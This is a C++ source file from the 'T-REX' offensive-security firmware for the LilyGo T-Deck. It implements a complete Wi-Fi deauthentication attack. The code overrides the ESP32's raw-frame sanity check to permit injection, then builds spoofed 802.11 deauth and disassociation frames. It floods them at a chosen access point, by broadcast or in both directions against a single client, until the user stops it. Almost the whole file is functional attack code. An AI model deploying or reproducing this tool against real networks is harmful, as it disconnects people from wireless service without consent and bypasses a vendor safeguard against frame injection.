// T-REX — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// Portions derived from Bruce firmware (https://github.com/pr3y/Bruce)
// Bruce is licensed under the GNU Affero General Public License v3.0 (AGPL-3.0).
// Modifications are licensed under AGPL-3.0-or-later.

#include "deauth_functions.h"
#include "input_handling.h"
#include "task_manager.h"

extern InputHandling inputHandler;

// Override ESP32 ROM sanity check — our .o is linked before libnet80211.a so this wins.
// Returns 1 when arg==31337 (raw injection call) to allow the frame through.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    return 0;
}

static const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

struct DeauthParams {
    uint8_t           bssid[6];
    uint8_t           client[6];
    bool              directed;
    volatile uint32_t framesSent;
    volatile uint32_t framesFailed;
};

// Builds a deauth (0xC0) or disassoc (0xA0) frame with randomised sequence number
static void buildFrame(uint8_t* f, const uint8_t* da, const uint8_t* sa,
                       const uint8_t* bssid, bool is_disassoc) {
    f[0] = is_disassoc ? 0xA0 : 0xC0;
    f[1] = 0x00;
    f[2] = 0x3a; f[3] = 0x01;          // duration 314 µs
    memcpy(f+4,  da,    6);
    memcpy(f+10, sa,    6);
    memcpy(f+16, bssid, 6);
    uint16_t seq = random(0, 4096);
    f[22] = (seq >> 4) & 0xFF;
    f[23] = (seq & 0x0F) << 4;
    f[24] = 0x07; f[25] = 0x00;        // reason 7: class-3 from non-assoc STA
}

// Send one frame three times with 1 ms gaps (mirrors Bruce's send_raw_frame)
static inline void sendFrame3x(const uint8_t* f, volatile uint32_t& ok, volatile uint32_t& fail) {
    for (int i = 0; i < 3; i++) {
        esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
        if (e == ESP_OK) ok++; else fail++;
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

static void deauthTaskFn(void* p) {
    DeauthParams* params = (DeauthParams*)p;
    uint8_t frame[26];

    while (!TaskManager::stopRequested) {
        if (params->directed) {
            // AP → client
            buildFrame(frame, params->client, params->bssid, params->bssid, false);
            sendFrame3x(frame, params->framesSent, params->framesFailed);
            buildFrame(frame, params->client, params->bssid, params->bssid, true);
            sendFrame3x(frame, params->framesSent, params->framesFailed);
            // client → AP
            buildFrame(frame, params->bssid, params->client, params->bssid, false);
            sendFrame3x(frame, params->framesSent, params->framesFailed);
            buildFrame(frame, params->bssid, params->client, params->bssid, true);
            sendFrame3x(frame, params->framesSent, params->framesFailed);
        } else {
            // AP → broadcast (deauth + disassoc)
            buildFrame(frame, BROADCAST, params->bssid, params->bssid, false);
            sendFrame3x(frame, params->framesSent, params->framesFailed);
            buildFrame(frame, BROADCAST, params->bssid, params->bssid, true);
            sendFrame3x(frame, params->framesSent, params->framesFailed);
        }
        vTaskDelay(pdMS_TO_TICKS(2));
    }
    TaskManager::taskRunning = false;
    vTaskDelete(nullptr);
}

DeauthAttack::DeauthAttack(DisplayManager& displayManager, WiFiFunctions& wifiFunctions)
    : displayManager(displayManager), wifiFunctions(wifiFunctions) {}

void DeauthAttack::sendBroadcastBurst(const uint8_t* bssid) {
    uint8_t frame[26];
    volatile uint32_t ok = 0, fail = 0;
    for (int r = 0; r < 5; r++) {
        buildFrame(frame, BROADCAST, bssid, bssid, false);
        sendFrame3x(frame, ok, fail);
        buildFrame(frame, BROADCAST, bssid, bssid, true);
        sendFrame3x(frame, ok, fail);
    }
}

bool DeauthAttack::parseMac(const char* str, uint8_t* mac) {
    if (!str || strlen(str) < 17) return false;
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]) == 6;
}

String DeauthAttack::macStr(const uint8_t* m) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0],m[1],m[2],m[3],m[4],m[5]);
    return String(buf);
}

void DeauthAttack::start(char* args) {
    if (!args || !*args) {
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println("Usage:");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println("  deauth <index>           (after scanwifi)");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println("  deauth <bssid> [ch] [client]");
        displayManager.printCommandScreen();
        return;
    }

    char buf[128];
    strncpy(buf, args, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char* first      = strtok(buf,     " ");
    char* channelStr = strtok(nullptr, " ");
    char* clientStr  = strtok(nullptr, " ");

    uint8_t bssid[6];
    int     channel = 6;

    if (strchr(first, ':') == nullptr) {
        int idx = atoi(first);
        if (!wifiFunctions.isScanDone()) {
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.println("Run scanwifi first.");
            displayManager.printCommandScreen();
            return;
        }
        if (!wifiFunctions.getNetworkInfo(idx, bssid, &channel)) {
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.printText("Invalid index. Max: ");
            displayManager.println(wifiFunctions.getNetworkCount() - 1);
            displayManager.printCommandScreen();
            return;
        }
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.printText("Target ["); displayManager.printText(idx);
        displayManager.printText("]: ");
        displayManager.setTextColor(TFT_CYAN);
        displayManager.println(macStr(bssid).c_str());
        displayManager.setTextColor(TFT_WHITE);
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.printText("Channel: "); displayManager.println(channel);
        delay(800);
    } else {
        if (!parseMac(first, bssid)) {
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.println("Invalid BSSID. Format: XX:XX:XX:XX:XX:XX");
            displayManager.printCommandScreen();
            return;
        }
        if (channelStr) { int ch = atoi(channelStr); if (ch >= 1 && ch <= 13) channel = ch; }
    }

    uint8_t clientMac[6];
    bool directed = false;
    if (clientStr && strlen(clientStr) == 17) directed = parseMac(clientStr, clientMac);

    sendDeauthFrames(bssid, directed ? clientMac : BROADCAST, channel, directed);
}

void DeauthAttack::sendDeauthFrames(const uint8_t* bssid, const uint8_t* client,
                                     int channel, bool directed) {
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP("x", nullptr, channel, 1, 0, false);
    delay(100);
    esp_wifi_set_promiscuous(true);
    delay(50);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    delay(50);

    displayManager.clearScreen();
    displayManager.setCursor(10, outputY);
    displayManager.setTextColor(TFT_RED);
    displayManager.println("-- DEAUTH ATTACK --");
    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("AP:      ");
    displayManager.setTextColor(TFT_CYAN);
    displayManager.println(macStr(bssid).c_str());
    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("Target:  ");
    displayManager.setTextColor(directed ? TFT_YELLOW : TFT_MAGENTA);
    displayManager.println(directed ? macStr(client).c_str() : "BROADCAST");
    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("Channel: "); displayManager.println(channel);
    if (directed) {
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(0x7BEF);
        displayManager.println("Mode: bidirectional");
        displayManager.setTextColor(TFT_WHITE);
    }
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.setTextColor(TFT_GREEN);
    displayManager.println("Running on Core 0  q=stop");
    displayManager.setTextColor(TFT_WHITE);
    int32_t counterY = displayManager.getCursorY();

    DeauthParams params;
    memcpy(params.bssid,  bssid,  6);
    memcpy(params.client, client, 6);
    params.directed     = directed;
    params.framesSent   = 0;
    params.framesFailed = 0;

    if (!TaskManager::start(deauthTaskFn, "deauth", &params, TASK_STACK_SMALL, 0)) {
        displayManager.println("Task start failed.");
        displayManager.printCommandScreen();
        return;
    }

    unsigned long lastUpd = 0;
    while (TaskManager::isRunning()) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') TaskManager::requestStop();

        unsigned long now = millis();
        if (now - lastUpd > 200) {
            displayManager.fillRect(10, counterY, 300, LINE_HEIGHT * 2 + 4, TFT_BLACK);
            displayManager.setCursor(10, counterY);
            displayManager.setTextColor(TFT_GREEN);
            displayManager.printText("OK: ");
            displayManager.setTextColor(TFT_YELLOW);
            displayManager.printText((int)params.framesSent);
            displayManager.setTextColor(TFT_WHITE);
            displayManager.printText("  ");
            displayManager.setTextColor(TFT_RED);
            displayManager.printText("FAIL: ");
            displayManager.setTextColor(TFT_YELLOW);
            displayManager.println((int)params.framesFailed);
            displayManager.setTextColor(TFT_WHITE);
            lastUpd = now;
        }
        delay(10);
    }
    TaskManager::cleanup();
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);

    displayManager.clearScreen();
    displayManager.setCursor(10, outputY);
    displayManager.setTextColor(TFT_YELLOW);
    displayManager.println("-- Attack stopped --");
    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("Total frames sent: ");
    displayManager.println((int)params.framesSent);
    delay(2000);
    displayManager.tdeck_begin();
}
